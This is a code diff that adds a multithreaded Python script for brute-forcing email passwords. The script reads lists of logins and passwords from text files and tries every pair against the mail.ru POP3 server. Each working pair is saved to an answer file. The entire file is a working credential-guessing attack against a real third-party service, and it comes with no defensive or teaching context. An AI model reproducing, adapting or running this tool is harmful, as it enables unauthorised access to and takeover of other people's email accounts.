@@ -1,0 +1,85 @@
+import poplib
+import threading
+
+f_pass = open('passwords.txt')
+Pass_list = f_pass.readlines()
+f_pass.close()
+
+f_login = open('logins.txt')
+Login_list = f_login.readlines()
+f_login.close()
+
+f_answer = open('answer.txt','w')
+
+threads = []
+
+def threads_maker(list_l):
+	len_l = len(list_l)
+	N = int(input("Enter the number of threads: "))
+	while True:
+		if N <= len_l:
+			break
+		else:
+			N = int(input("Enter less number of threads: "))
+	b_e = []
+	b_e = split_list(len_l, N)
+	for k in range(N):
+		thread = threading.Thread(target=connect, args=(range(b_e[k][0],b_e[k][-1]+1),
+														Login_list, Pass_list))
+		thread.start()
+		threads.append(thread)
+		print("threads", threads)
+	for t in threads:
+		t.join()
+
+def split_list(len_list, piece):
+    chunk_len = len_list // piece
+    rest_count = len_list % piece
+    it = []
+    for i in range(len_list):
+        it.append(i)
+    chunks = []
+    for i in range(piece):
+        chunk = it[:chunk_len]
+        it = it[chunk_len:]
+        if rest_count > 0:
+            chunk.append(it.pop(0))
+            rest_count -= 1
+        chunks.append(chunk)
+    return chunks
+
+def connect(index, list_l, list_p):
+	for i in index:
+		if list_l[i] != list_l[-1]:
+			list_l[i] = list_l[i][:-1]
+		print(list_l[i])
+		pass_ = find_password(list_l[i], list_p)
+		f_answer.write(str(list_l[i]) + ':' + str(pass_) + '\n')
+
+def find_password(log, list_p):
+	a = 0
+	for password in list_p:
+		server = 'pop.mail.ru'
+		box = poplib.POP3_SSL(server)
+		print(box.getwelcome())
+		print(box.user(log))
+		if password != list_p[-1]:
+			password = password[:-1]
+		try:
+			ans = box.pass_(password)
+			print(ans)
+			a = -1
+			print(box.quit())
+		except Exception:
+			print('Wrong password')
+			a += 1
+			continue
+		if a == -1:
+			break
+	if a == len(list_p):
+		password='"Not Found"'
+	return password
+
+
+threads_maker(Login_list)
+f_answer.close()
